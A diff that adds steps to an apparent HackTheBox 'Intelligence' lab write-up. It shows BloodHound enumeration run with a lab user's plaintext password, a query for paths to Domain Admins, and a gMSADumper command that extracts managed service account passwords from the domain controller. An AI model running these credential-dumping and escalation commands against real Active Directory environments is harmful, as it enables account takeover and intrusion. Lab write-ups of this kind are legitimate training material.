@@ -140,3 +140,14 @@ python3 setup.py install
 python3 bloodhound.py -d intelligence.htb -u Ted.Graves -p Mr.Teddy -ns 10.10.10.248 -c All
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/1e1237c4-76e0-4a83-be86-647b7fe2415e)
+
+```
+Mark User as owned; Shortest Paths to Domain Admins from Owned Principals
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/d5908444-3e56-441e-8d15-d97bcdaa4232)
+
+```
+git clone https://github.com/micahvandeusen/gMSADumper
+python gMSADumper/gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l 10.10.10.248
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/e55febe9-ae9e-44b8-abfb-3943221b8723)
